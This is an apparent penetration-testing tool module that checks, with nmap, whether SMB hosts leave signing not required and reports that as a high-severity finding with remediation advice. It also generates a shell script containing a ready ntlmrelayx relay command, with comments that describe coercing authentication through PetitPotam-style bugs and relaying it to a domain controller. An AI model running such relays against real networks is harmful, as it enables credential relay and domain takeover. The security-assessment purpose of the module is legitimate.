"""VAJRA ad.ntlm_relay — detect relay-worthy SMB targets and wire up an
active ntlmrelayx relay.

Passive/read-only probes (SMB signing not-required) confirm a host is a
viable NTLM-relay target BEFORE any relay runs. An active relay is NOT started
here — it requires an inbound coerced NTLM auth (PrintSpooler/PetitPotam-style)
which is operator-run; VAJRA emits the exact ntlmrelayx invocation as an
evidence resource. Signature detection is delegated to nmap's authoritative
`smb2-security-mode` script when present (zero-false-positive), else the
finding is reported only as `possible`.
"""
from core.database import Finding
from core.utils import which_tool


def _run_cmd(argv, timeout=40):
    import subprocess
    try:
        r = subprocess.run(argv, capture_output=True, text=True,
                           timeout=timeout)
        return r.stdout or r.stderr
    except Exception:
        return None


def _nmaps_signing_mode(host):
    """Use nmap's smb2-security-mode NSE for an authoritative signing verdict.
    Return 'required' / 'not-required' / 'unknown' / None."""
    nmap = which_tool("nmap")
    if not nmap:
        return None
    out = _run_cmd([nmap, "-Pn", "-sT", "-p", "445", "--script",
                    "smb2-security-mode", "-oN", "-", host], timeout=40)
    if not out:
        return None
    low = str(out).lower()
    if "message signing enabled and required" in low:
        return "required"
    if "message signing enabled but not required" in low:
        return "not-required"
    if "smb2-security-mode" in low:
        return "unknown"
    return None


def run(engine):
    t = engine.target
    host = t.scan_host()
    services = {int(s.get("port")): s for s in engine.state.get("services", [])}
    if 445 not in services and 139 not in services:
        engine.db.add_event(t.display, "ad.ntlm_relay",
                            "no SMB listener — skipped")
        return

    signing = _nmaps_signing_mode(host)
    relay_worthy = signing == "not-required"

    evidence_lines = ["target=%s:445 signing=%s" % (host, signing)]
    tool = which_tool("impacket-ntlmrelayx", "ntlmrelayx.py")
    if tool and relay_worthy:
        rel = engine.save_evidence(
            "ntlmrelay_%s.sh" % re_sub(host),
            "\n".join([
                "#!/bin/sh",
                "# VAJRA: relay-worthy SMB target (signing not required).",
                "# 1) Obtain an inbound NTLM auth to this box via a coercion",
                "#    (PrintNightmare / PetitPotam / DFSCoerce) forcing a",
                "#    high-integrity account to authenticate here.",
                "# 2) Run the relay; swap -t for your real target (e.g. the",
                "#    DC: smb://<dc-ip>):",
                tool + " -t smb://%s -smb2support -i" % host,
                "",
            ]) + "\n")
        evidence_lines.append("relay resource: " + (rel or "-"))

    if relay_worthy:
        engine.db.add_finding(Finding(
            t.display, "ad.ntlm_relay", "misconfiguration", "high",
            "SMB SIGNING NOT REQUIRED — NTLM-relay worthy",
            detail=("Target %s does not require SMB signing (authoritative "
                    "nmap smb2-security-mode). An attacker who can coerce an "
                    "inbound NTLM authentication (Printer bug / PetitPotam on "
                    "a domain member) can relay it and authenticate as the "
                    "victim." % host),
            evidence="\n".join(evidence_lines)[:3000],
            remediation="Require SMB signing for all domain clients (GPO: "
                        "'Microsoft network server: Digitally sign "
                        "communications (always)'); disable SMBv1.",
            confidence="firm" if tool else "possible"))
        engine.log.finding("[relay] %s is SMB-signing-not-required (relay "
                           "worthy)" % host)
    elif signing == "required":
        engine.db.add_finding(Finding(
            t.display, "ad.ntlm_relay", "hardening", "info",
            "SMB signing required — relay not viable",
            detail="Target enforces SMB signing; NTLM relay to this host is "
                   "mitigated.", confidence="firm"))
    else:
        engine.db.add_event(t.display, "ad.ntlm_relay",
                            "signing state unknown/inconclusive (%s)" % signing)


def re_sub(s):
    return "".join(c if c.isalnum() else "_" for c in s)